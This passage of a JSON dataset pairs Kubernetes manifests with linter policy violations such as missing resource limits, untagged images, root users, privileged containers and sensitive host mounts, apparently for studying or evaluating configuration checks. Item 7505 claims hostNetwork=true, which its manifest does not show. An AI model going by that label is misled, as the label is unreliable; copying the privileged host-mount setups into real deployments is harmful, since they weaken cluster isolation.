--bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "7488",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "7489",
    "manifest_path": "data/manifests/the_stack_sample/sample_2736.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nfs-service\n  namespace: ns-gitea\nspec:\n  selector:\n    role: nfs\n  ports:\n  - name: tcp-nfs\n    port: 2049\n    protocol: TCP\n  - name: udp-nfs\n    port: 111\n    protocol: UDP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[role:nfs])"
  },
  {
    "id": "7490",
    "manifest_path": "data/manifests/the_stack_sample/sample_2737.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2607\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7491",
    "manifest_path": "data/manifests/the_stack_sample/sample_2737.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2607\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7492",
    "manifest_path": "data/manifests/the_stack_sample/sample_2737.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2607\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7493",
    "manifest_path": "data/manifests/the_stack_sample/sample_2737.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2607\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7494",
    "manifest_path": "data/manifests/the_stack_sample/sample_2737.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2607\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7495",
    "manifest_path": "data/manifests/the_stack_sample/sample_2739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: video-generator\n  namespace: default\n  labels:\n    app: video-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: video-generator\n  template:\n    metadata:\n      labels:\n        app: video-generator\n    spec:\n      containers:\n      - name: video-generator\n        image: $IMAGE_NAME\n        env:\n        - name: SPREADSHEET_ID\n          value: $SPREADSHEET_ID\n        - name: GCS_BUCKET_NAME\n          value: $GCS_BUCKET_NAME\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"video-generator\" is using an invalid container image, \"$IMAGE_NAME\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7496",
    "manifest_path": "data/manifests/the_stack_sample/sample_2739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: video-generator\n  namespace: default\n  labels:\n    app: video-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: video-generator\n  template:\n    metadata:\n      labels:\n        app: video-generator\n    spec:\n      containers:\n      - name: video-generator\n        image: $IMAGE_NAME\n        env:\n        - name: SPREADSHEET_ID\n          value: $SPREADSHEET_ID\n        - name: GCS_BUCKET_NAME\n          value: $GCS_BUCKET_NAME\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"video-generator\" does not have a read-only root file system"
  },
  {
    "id": "7497",
    "manifest_path": "data/manifests/the_stack_sample/sample_2739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: video-generator\n  namespace: default\n  labels:\n    app: video-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: video-generator\n  template:\n    metadata:\n      labels:\n        app: video-generator\n    spec:\n      containers:\n      - name: video-generator\n        image: $IMAGE_NAME\n        env:\n        - name: SPREADSHEET_ID\n          value: $SPREADSHEET_ID\n        - name: GCS_BUCKET_NAME\n          value: $GCS_BUCKET_NAME\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"video-generator\" is not set to runAsNonRoot"
  },
  {
    "id": "7498",
    "manifest_path": "data/manifests/the_stack_sample/sample_2739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: video-generator\n  namespace: default\n  labels:\n    app: video-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: video-generator\n  template:\n    metadata:\n      labels:\n        app: video-generator\n    spec:\n      containers:\n      - name: video-generator\n        image: $IMAGE_NAME\n        env:\n        - name: SPREADSHEET_ID\n          value: $SPREADSHEET_ID\n        - name: GCS_BUCKET_NAME\n          value: $GCS_BUCKET_NAME\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"video-generator\" has cpu request 0"
  },
  {
    "id": "7499",
    "manifest_path": "data/manifests/the_stack_sample/sample_2739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: video-generator\n  namespace: default\n  labels:\n    app: video-generator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: video-generator\n  template:\n    metadata:\n      labels:\n        app: video-generator\n    spec:\n      containers:\n      - name: video-generator\n        image: $IMAGE_NAME\n        env:\n        - name: SPREADSHEET_ID\n          value: $SPREADSHEET_ID\n        - name: GCS_BUCKET_NAME\n          value: $GCS_BUCKET_NAME\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"video-generator\" has memory limit 0"
  },
  {
    "id": "7500",
    "manifest_path": "data/manifests/the_stack_sample/sample_2741.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whoami\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: whoami\n  template:\n    metadata:\n      labels:\n        app: whoami\n    spec:\n      containers:\n      - name: whoami\n        image: traefik/whoami\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"whoami\" is using an invalid container image, \"traefik/whoami\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7501",
    "manifest_path": "data/manifests/the_stack_sample/sample_2741.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whoami\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: whoami\n  template:\n    metadata:\n      labels:\n        app: whoami\n    spec:\n      containers:\n      - name: whoami\n        image: traefik/whoami\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"whoami\" does not have a read-only root file system"
  },
  {
    "id": "7502",
    "manifest_path": "data/manifests/the_stack_sample/sample_2741.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whoami\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: whoami\n  template:\n    metadata:\n      labels:\n        app: whoami\n    spec:\n      containers:\n      - name: whoami\n        image: traefik/whoami\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"whoami\" is not set to runAsNonRoot"
  },
  {
    "id": "7503",
    "manifest_path": "data/manifests/the_stack_sample/sample_2741.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whoami\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: whoami\n  template:\n    metadata:\n      labels:\n        app: whoami\n    spec:\n      containers:\n      - name: whoami\n        image: traefik/whoami\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"whoami\" has cpu request 0"
  },
  {
    "id": "7504",
    "manifest_path": "data/manifests/the_stack_sample/sample_2741.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: whoami\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: whoami\n  template:\n    metadata:\n      labels:\n        app: whoami\n    spec:\n      containers:\n      - name: whoami\n        image: traefik/whoami\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"whoami\" has memory limit 0"
  },
  {
    "id": "7505",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7506",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rook-direct-mount\" does not have a read-only root file system"
  },
  {
    "id": "7507",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"rook-direct-mount\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "7508",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"rook-direct-mount\" is privileged"
  },
  {
    "id": "7509",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rook-direct-mount\" is not set to runAsNonRoot"
  },
  {
    "id": "7510",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"rook-direct-mount\""
  },
  {
    "id": "7511",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rook-direct-mount\" has cpu request 0"
  },
  {
    "id": "7512",
    "manifest_path": "data/manifests/the_stack_sample/sample_2745.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-direct-mount\n  namespace: rook-ceph\n  labels:\n    app: rook-direct-mount\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rook-direct-mount\n  template:\n    metadata:\n      labels:\n        app: rook-direct-mount\n    spec:\n      containers:\n      - name: rook-direct-mount\n        image: rook/ceph:v1.6.0\n        command:\n        - /tini\n        args:\n        - -g\n        - --\n        - /usr/local/bin/toolbox.sh\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: ROOK_CEPH_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-username\n        - name: ROOK_CEPH_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: rook-ceph-mon\n              key: ceph-secret\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /dev\n          name: dev\n        - mountPath: /sys/bus\n          name: sysbus\n        - mountPath: /lib/modules\n          name: libmodules\n        - name: mon-endpoint-volume\n          mountPath: /etc/rook\n      volumes:\n      - name: dev\n        hostPath:\n          path: /dev\n      - name: sysbus\n        hostPath:\n          path: /sys/bus\n      - name: libmodules\n        hostPath:\n          path: /lib/modules\n      - name: mon-endpoint-volume\n        configMap:\n          name: rook-ceph-mon-endpoints\n          items:\n          - key: data\n            path: mon-endpoints\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rook-direct-mount\" has memory limit 0"
  },
  {
    "id": "7513",
    "manifest_path": "data/manifests/the_stack_sample/sample_2746.yaml",
